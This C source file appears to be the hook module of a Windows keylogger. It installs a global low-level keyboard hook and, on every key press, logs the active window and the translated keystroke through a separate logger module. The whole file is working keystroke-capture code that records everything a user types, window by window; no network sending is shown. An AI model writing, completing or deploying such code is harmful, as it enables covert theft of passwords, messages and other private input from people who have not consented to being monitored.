
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 // Define Windows 10/11
#endif
#pragma warning(push)
#pragma warning(disable: 4668) // Desativa avisos de macros do Windows SDK
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shellapi.h>
#pragma warning(pop)

#include <windows.h>
#include <stdio.h>
#include "hook.h"
#include "window.h"
#include "keyboard.h"
#include "logger.h"

static HHOOK g_hook = NULL;


static LRESULT CALLBACK keyboard_callback(
    int nCode,
    WPARAM wParam,
    LPARAM lParam
)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT *kb;
        char key[32];

        kb = (KBDLLHOOKSTRUCT *)lParam;

        if (wParam == WM_KEYDOWN ||
            wParam == WM_SYSKEYDOWN)
        {
            if (window_changed())
            {
                logger_write_window();
            }

            if (keyboard_translate(
                    kb->vkCode,
                    wParam,
                    key,
                    sizeof(key)))
            {
                logger_write_key(key);
            }
        }
        else if (wParam == WM_KEYUP ||
                 wParam == WM_SYSKEYUP)
        {
            keyboard_translate(
                kb->vkCode,
                wParam,
                key,
                sizeof(key)
            );
        }
    }

    return CallNextHookEx(
        g_hook,
        nCode,
        wParam,
        lParam
    );
}


BOOL hook_install(void)
{
    g_hook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        keyboard_callback,
        GetModuleHandle(NULL),
        0
    );

    return (g_hook != NULL);
}


void hook_uninstall(void)
{
    if (g_hook != NULL)
    {
        UnhookWindowsHookEx(g_hook);
        g_hook = NULL;
    }
}